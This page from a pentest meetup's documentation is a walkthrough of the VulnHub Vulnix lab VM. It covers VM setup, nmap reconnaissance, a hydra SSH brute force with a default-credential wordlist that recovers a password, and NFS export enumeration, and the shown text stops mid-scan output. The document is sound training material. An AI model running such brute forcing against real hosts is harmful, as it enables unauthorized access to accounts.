

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.20. Vulnix &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.21. Google’s XSS Game" href="googles_xss_game.html"/>
        <link rel="prev" title="3.19. ZorZ" href="zorz.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.20. Vulnix</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.20.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.20.1.1. Setting up the VMware VM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#software-used">3.20.1.2. Software Used</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaissance">3.20.2. Reconnaissance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-via-enumerator">3.20.2.1. Reconnaissance via <code class="docutils literal"><span class="pre">enumerator</span></code></a></li>
<li class="toctree-l4"><a class="reference internal" href="#doing-the-enumerator-reconnaissance-by-hand">3.20.2.2. Doing the <code class="docutils literal"><span class="pre">enumerator</span></code> reconnaissance by hand</a></li>
<li class="toctree-l4"><a class="reference internal" href="#more-reconnaissance">3.20.2.3. More Reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#an-embarrassment-of-riches">3.20.2.4. An embarrassment of riches?</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#attacking-nfs">3.20.3. Attacking NFS</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#reviewing-nfs-mounts">3.20.3.1. Reviewing nfs mounts</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-access-the-easy-way-nfspysh-and-rsh">3.20.3.2. Getting access the easy way: <code class="docutils literal"><span class="pre">nfspysh</span></code> and <code class="docutils literal"><span class="pre">rsh</span></code></a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-access-and-root-the-harder-way-mount-nfs-and-ssh">3.20.3.3. Getting access (and root) the harder way: <code class="docutils literal"><span class="pre">mount.nfs</span></code> and <code class="docutils literal"><span class="pre">ssh</span></code></a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.20. Vulnix</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/vulnix.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="vulnix">
<span id="id1"></span><h1>3.20. Vulnix<a class="headerlink" href="#vulnix" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.20.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">HackLAB: Vulnix</a>:</p>
<blockquote>
<div>Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!). … The goal; boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish – excluding the actual hacking of the vmdk.</div></blockquote>
<p><a class="reference external" href="http://www.rebootuser.com/?page_id=1721">Rebootuser - Local Linux Enumeration &amp; Privilege Escalation</a> shows techniques/hints.</p>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.20.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>See <a class="reference internal" href="virtual_machine_setup.html#vmsetup"><span class="std std-ref">Virtual Machine Setup</span></a> for background on using the VMware vmdk file. Vulnix is Ubuntu 12.04, x86, and 512MB memory. For KVM you can use a backing store to undo any changes to the disk:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">BACKING</span><span class="o">=</span>Vulnix.vmdk
<span class="nv">VM_DISK</span><span class="o">=</span>Vulnix-changes.qcow2
curl --remote-name http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z
<span class="nv">$SUDO</span> apt-get install p7zip-full -y
7z e Vulnix.7z
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$BACKING</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$VM_DISK</span>
<span class="c1"># To revert to original image</span>
<span class="c1"># $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK</span>
</pre></div>
</div>
<p>Then Linux KVM could use the VM_DISK to create the Vulnix VM. The actual command the author used in Debian Linux to create the VM was (though it’s recommended to use a GUI):</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>Vulnix
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;Vulnix&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
<span class="c1">#    --console pty,target_type=virtio \</span>
<span class="c1"># Useful commands:</span>
<span class="c1"># $SUDO virsh help</span>
<span class="c1"># $SUDO virsh list --all</span>
<span class="c1"># $SUDO virsh destroy --graceful $VM</span>
<span class="c1"># $SUDO virsh start $VM</span>
<span class="c1"># $SUDO virsh reboot $VM</span>
<span class="c1"># $SUDO virsh shutdown $VM</span>
<span class="c1"># $SUDO virsh undefine [--wipe-storage] $VM</span>
<span class="c1"># $SUDO virsh undefine $VM</span>
<span class="c1"># $SUDO virsh help destroy</span>
<span class="c1">#</span>
</pre></div>
</div>
<p>So if Vulnix were running and you wanted to “start over again”:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
<span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;Vulnix&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
</pre></div>
</div>
</div>
<div class="section" id="software-used">
<h3>3.20.1.2. Software Used<a class="headerlink" href="#software-used" title="Permalink to this headline">¶</a></h3>
<p>Extra software needed on Kali Linux. <code class="docutils literal"><span class="pre">enumerator</span></code> depends on: nmap; nikto, dirb (http enumeration); hydra (ftp enumeration); and enum4linux (netbios enumeration). Only non-root accounts use virtualenv.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nv">$SUDO</span> pip install -U virtualenvwrapper
  mkvirtualenv vulnix
  <span class="c1"># To see what virtual environments exist</span>
  <span class="c1">#   lsvirtualenv</span>
  <span class="c1"># To switch virtual environments</span>
  <span class="c1">#   workon vulnix</span>
  <span class="c1"># To deactivate the current virtual environment</span>
  <span class="c1">#   deactivate</span>
  <span class="c1"># To delete a virtual environment</span>
  <span class="c1">#   rmvirtualenv vulnix</span>
<span class="k">fi</span>
pip install -U enumerator
<span class="nv">$SUDO</span> apt-get install nfs-common -y
<span class="nv">$SUDO</span> apt-get install hydra -y
<span class="nv">$SUDO</span> apt-get install nikto -y
<span class="nv">$SUDO</span> apt-get install dirb -y
<span class="nv">$SUDO</span> apt-get install enum4linux -y
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaissance">
<h2>3.20.2. Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="reconnaissance-via-enumerator">
<h3>3.20.2.1. Reconnaissance via <code class="docutils literal"><span class="pre">enumerator</span></code><a class="headerlink" href="#reconnaissance-via-enumerator" title="Permalink to this headline">¶</a></h3>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ #</span> Check <span class="k">for</span> new IPs on the subnet <span class="o">(</span>vulnix VM<span class="o">)</span>
<span class="gp">(vulnix)hacker@kali:~$</span> <span class="nv">SUBNET</span><span class="o">=</span><span class="s2">&quot;192.168.1.0/24&quot;</span>
<span class="gp">(vulnix)hacker@kali:~$</span> nmap -sn <span class="nv">$SUBNET</span>

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-16 11:47 PDT</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00074s latency).</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">(vulnix)hacker@kali:~$ #</span> Run enumerator on vulnix
<span class="gp">(vulnix)hacker@kali:~$</span> <span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO rm -rf results/
<span class="gp">(vulnix)hacker@kali:~$ $SUDO $</span><span class="o">(</span>which enumerator<span class="o">)</span> -s <span class="nv">$IP</span>
<span class="go">[+] IP list parsed, sending hosts to nmap...</span>
<span class="go">   [-] nmap: running TCP &amp; UDP scans for host: 192.168.1.103</span>
<span class="gp">(vulnix)hacker@kali:~$</span> ls results/<span class="nv">$IP</span>
<span class="go">192.168.1.103-rpc-showmount.txt    192.168.1.103-tcp-standard.txt</span>
<span class="go">192.168.1.103-ssh-22-hydra.txt     192.168.1.103-udp-standard.txt</span>
<span class="go">192.168.1.103-ssh-22-standard.txt</span>
<span class="gp">(vulnix)hacker@kali:~$</span> <span class="k">for</span> f in results/<span class="nv">$IP</span>/*.txt<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -e <span class="s2">&quot;\n\n\nFILE </span><span class="nv">$f</span><span class="s2">\n&quot;</span><span class="p">;</span> cat <span class="nv">$f</span><span class="p">;</span> <span class="k">done</span>



<span class="go">FILE results/192.168.1.103/192.168.1.103-rpc-showmount.txt</span>

<span class="go">Export list for 192.168.1.103:</span>
<span class="go">/home/vulnix *</span>



<span class="go">FILE results/192.168.1.103/192.168.1.103-ssh-22-hydra.txt</span>

<span class="gp">#</span> Hydra v8.1 run at <span class="m">2015</span>-04-16 <span class="m">11</span>:53:09 on <span class="m">192</span>.168.1.103 ssh <span class="o">(</span>hydra -L /home/hacker/.virtualenvs/vulnix/lib/python2.7/site-packages/enumerator/lib/ssh/user-password-tiny.txt -P /home/hacker/.virtualenvs/vulnix/lib/python2.7/site-packages/enumerator/lib/ssh/user-password-tiny.txt -o results/192.168.1.103/192.168.1.103-ssh-22-hydra.txt -t <span class="m">4</span> <span class="m">192</span>.168.1.103 ssh<span class="o">)</span>
<span class="go">[22][ssh] host: 192.168.1.103   login: user   password: letmein</span>



<span class="go">FILE results/192.168.1.103/192.168.1.103-ssh-22-standard.txt</span>

<span class="gp">#</span> Nmap <span class="m">6</span>.47 scan initiated Thu Apr <span class="m">16</span> <span class="m">11</span>:53:09 <span class="m">2015</span> as: nmap -Pn -p <span class="m">22</span> --script<span class="o">=</span>ssh-hostkey -oN results/192.168.1.103/192.168.1.103-ssh-22-standard.txt <span class="m">192</span>.168.1.103
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00056s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>
<span class="go">| ssh-hostkey:</span>
<span class="go">|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)</span>
<span class="go">|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)</span>
<span class="go">|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)</span>
<span class="go">MAC Address: 52:54:00:B0:A8:8C (QEMU Virtual NIC)</span>

<span class="gp">#</span> Nmap <span class="k">done</span> at Thu Apr <span class="m">16</span> <span class="m">11</span>:53:09 <span class="m">2015</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">0</span>.35 seconds



<span class="go">FILE results/192.168.1.103/192.168.1.103-tcp-standard.txt</span>

<span class="gp">#</span> Nmap <span class="m">6</span>.47 scan initiated Thu Apr <span class="m">16</span> <span class="m">11</span>:50:15 <span class="m">2015</span> as: nmap -Pn -T4 -sS -sV -oN results/192.168.1.103/192.168.1.103-tcp-standard.txt -oG results/192.168.1.103/192.168.1.103-tcp-greppable.txt <span class="m">192</span>.168.1.103
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00027s latency).</span>
<span class="go">Not shown: 988 closed ports</span>
<span class="go">PORT     STATE SERVICE    VERSION</span>
<span class="go">22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span>
<span class="go">25/tcp   open  smtp?</span>
<span class="go">79/tcp   open  finger     Linux fingerd</span>
<span class="go">110/tcp  open  pop3       Dovecot pop3d</span>
<span class="go">111/tcp  open  rpcbind    2-4 (RPC #100000)</span>
<span class="go">143/tcp  open  imap       Dovecot imapd</span>
<span class="go">512/tcp  open  exec       netkit-rsh rexecd</span>
<span class="go">513/tcp  open  login</span>
<span class="go">514/tcp  open  tcpwrapped</span>
<span class="go">993/tcp  open  ssl/imap   Dovecot imapd</span>
<span class="go">995/tcp  open  ssl/pop3   Dovecot pop3d</span>
<span class="go">2049/tcp open  nfs        2-4 (RPC #100003)</span>
<span class="go">MAC Address: 52:54:00:B0:A8:8C (QEMU Virtual NIC)</span>
<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>

<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="gp">#</span> Nmap <span class="k">done</span> at Thu Apr <span class="m">16</span> <span class="m">11</span>:53:04 <span class="m">2015</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">169</span>.39 seconds



<span class="go">FILE results/192.168.1.103/192.168.1.103-udp-standard.txt</span>

<span class="gp">#</span> Nmap <span class="m">6</span>.47 scan initiated Thu Apr <span class="m">16</span> <span class="m">11</span>:53:04 <span class="m">2015</span> as: nmap -Pn -T4 -sU -sV --open --top-ports <span class="m">10</span> -oN results/192.168.1.103/192.168.1.103-udp-standard.txt -oG results/192.168.1.103/192.168.1.103-udp-greppable.txt <span class="m">192</span>.168.1.103
<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="gp">#</span> Nmap <span class="k">done</span> at Thu Apr <span class="m">16</span> <span class="m">11</span>:53:09 <span class="m">2015</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">4</span>.75 seconds
</pre></div>
</div>
</div>
<div class="section" id="doing-the-enumerator-reconnaissance-by-hand">
<h3>3.20.2.2. Doing the <code class="docutils literal"><span class="pre">enumerator</span></code> reconnaissance by hand<a class="headerlink" href="#doing-the-enumerator-reconnaissance-by-hand" title="Permalink to this headline">¶</a></h3>
<p>Perform the equivalent of the <code class="docutils literal"><span class="pre">enumerator</span></code> reconnaissance by hand as a learning exercise. The order is the same order output above.</p>
<div class="section" id="nfs-mounts">
<h4>3.20.2.2.1. nfs mounts<a class="headerlink" href="#nfs-mounts" title="Permalink to this headline">¶</a></h4>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$</span> /sbin/showmount -e <span class="nv">$IP</span>
<span class="go">Export list for 192.168.1.103:</span>
<span class="go">/home/vulnix *</span>
</pre></div>
</div>
</div>
<div class="section" id="ssh-users-and-passwords">
<h4>3.20.2.2.2. ssh users and passwords<a class="headerlink" href="#ssh-users-and-passwords" title="Permalink to this headline">¶</a></h4>
<p><code class="docutils literal"><span class="pre">enumerator</span></code> simply ran <code class="docutils literal"><span class="pre">hydra</span></code> using the following file for both the userid and password guesses:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span>
<span class="n">admin</span>
<span class="n">toor</span>
<span class="n">letmein</span>
<span class="n">changeme</span>
<span class="n">administrator</span>
<span class="n">password</span>
<span class="mi">1</span>
<span class="mi">12</span>
<span class="mi">123</span>
<span class="mi">1234</span>
<span class="mi">12345</span>
<span class="mi">123456</span>
<span class="mi">1234567</span>
<span class="mi">12345678</span>
<span class="mi">1234567890</span>
<span class="n">ftp</span>
<span class="n">user</span>
<span class="n">guest</span>
</pre></div>
</div>
<p>You can use one of Kali’s password lists in <code class="file docutils literal"><span class="pre">/usr/share/wordlists</span></code>; “letmein” is in both <code class="file docutils literal"><span class="pre">rockyou.txt</span></code> and <code class="file docutils literal"><span class="pre">nmap.lst</span></code>. And “user” is not exactly a stretch for testing user ids. So a simple <code class="docutils literal"><span class="pre">hydra</span></code> run like the following would suffice:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>hydra -L user_list.txt -P rockyou.txt -o hydra_out.txt -t <span class="m">4</span> <span class="nv">$IP</span> ssh
</pre></div>
</div>
</div>
<div class="section" id="ssh-host-keys">
<h4>3.20.2.2.3. SSH host keys<a class="headerlink" href="#ssh-host-keys" title="Permalink to this headline">¶</a></h4>
<p>Host SSH keys can be obtained using <code class="docutils literal"><span class="pre">ssh-keyscan</span></code> with help from <code class="docutils literal"><span class="pre">ssh-keygen</span></code>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># using ssh-keyscan and ssh-keygen</span>
<span class="nv">TEMP</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
ssh-keyscan -t rsa1,rsa,dsa,ecdsa,ed25519 <span class="nv">$IP</span>&gt;<span class="nv">$TEMP</span> <span class="m">2</span>&gt;/dev/null
ssh-keygen -l -f <span class="nv">$TEMP</span>
rm -f <span class="nv">$TEMP</span>
</pre></div>
</div>
<p>resulting in:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ #</span> using ssh-keyscan and ssh-keygen
<span class="gp">(vulnix)hacker@kali:~$ TEMP=$</span><span class="o">(</span>mktemp<span class="o">)</span>
<span class="gp">(vulnix)hacker@kali:~$</span> ssh-keyscan -t rsa1,rsa,dsa,ecdsa,ed25519 <span class="nv">$IP</span>&gt;<span class="nv">$TEMP</span> <span class="m">2</span>&gt;/dev/null
<span class="gp">(vulnix)hacker@kali:~$</span> ssh-keygen -l -f <span class="nv">$TEMP</span>
<span class="go">256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f 192.168.1.103 (ECDSA)</span>
<span class="go">1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf 192.168.1.103 (DSA)</span>
<span class="go">2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a 192.168.1.103 (RSA)</span>
<span class="gp">(vulnix)hacker@kali:~$</span> rm -f <span class="nv">$TEMP</span>
</pre></div>
</div>
<p>Alternatively <code class="docutils literal"><span class="pre">nmap</span></code> can be used:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># using nmap</span>
nmap <span class="nv">$IP</span> --script ssh-hostkey
nmap <span class="nv">$IP</span> --script ssh-hostkey --script-args <span class="nv">ssh_hostkey</span><span class="o">=</span>full
<span class="c1"># nmap $IP --script ssh-hostkey --script-args ssh_hostkey=&#39;visual bubble&#39;</span>
<span class="c1"># nmap $IP --script ssh-hostkey --script-args ssh_hostkey=all</span>
</pre></div>
</div>
<p>resulting in:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ #</span> using nmap
<span class="gp">(vulnix)hacker@kali:~$ nmap $</span>IP --script ssh-hostkey

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:24 PDT</span>
<span class="go">Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan</span>
<span class="go">Ping Scan Timing: About 100.00% done; ETC: 10:24 (0:00:00 remaining)</span>
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00033s latency).</span>
<span class="go">Not shown: 988 closed ports</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">22/tcp   open  ssh</span>
<span class="go">| ssh-hostkey:</span>
<span class="go">|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)</span>
<span class="go">|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)</span>
<span class="go">|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)</span>
<span class="go">25/tcp   open  smtp</span>
<span class="go">79/tcp   open  finger</span>
<span class="go">110/tcp  open  pop3</span>
<span class="go">111/tcp  open  rpcbind</span>
<span class="go">143/tcp  open  imap</span>
<span class="go">512/tcp  open  exec</span>
<span class="go">513/tcp  open  login</span>
<span class="go">514/tcp  open  shell</span>
<span class="go">993/tcp  open  imaps</span>
<span class="go">995/tcp  open  pop3s</span>
<span class="go">2049/tcp open  nfs</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds</span>
<span class="gp">(vulnix)hacker@kali:~$ nmap $</span>IP --script ssh-hostkey --script-args <span class="nv">ssh_hostkey</span><span class="o">=</span>full

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:24 PDT</span>
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.0095s latency).</span>
<span class="go">Not shown: 988 closed ports</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">22/tcp   open  ssh</span>
<span class="go">| ssh-hostkey:</span>
